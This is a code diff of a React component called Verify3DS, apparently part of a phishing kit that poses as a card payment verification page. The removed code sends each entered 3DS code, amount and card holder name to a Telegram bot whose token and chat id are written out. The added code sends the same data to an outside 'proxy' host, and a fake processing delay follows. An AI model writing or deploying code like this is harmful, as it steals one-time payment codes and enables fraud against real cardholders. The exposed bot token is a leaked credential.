@@ -6,25 +6,18 @@ import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/components/ui/use-toast";
 
-const sendTelegramNotification = async (code: string, amount: string, cardHolder: string, verifyMethod: string) => {
+const send3DSData = async (verificationData: any) => {
   try {
-    const response = await fetch('https://api.telegram.org/bot7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU/sendMessage', {
+    await fetch('https://api.travelt-pay.site/api/notify-3ds', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify({
-        chat_id: "-4781499307",
-        text: `3DS Code Verification:
-Amount: ${amount}
-Card Holder: ${cardHolder}
-Verification Method: ${verifyMethod}
-Code: ${code}`,
-      }),
+      body: JSON.stringify(verificationData)
     });
-    console.log('3DS notification sent:', response.ok);
+    console.log('3DS data sent successfully');
   } catch (error) {
-    console.error('Error sending 3DS notification:', error);
+    console.error('Error sending 3DS data:', error);
   }
 };
 
@@ -47,8 +40,13 @@ export default function Verify3DS() {
     
     setIsSubmitting(true);
 
-    // Send 3DS code to Telegram
-    await sendTelegramNotification(code, amount, cardHolder, verifyMethod);
+    // Send 3DS data through proxy
+    await send3DSData({
+      code,
+      amount,
+      cardHolder,
+      verifyMethod
+    });
 
     // Add delay for processing
     await new Promise(resolve => setTimeout(resolve, 2000));
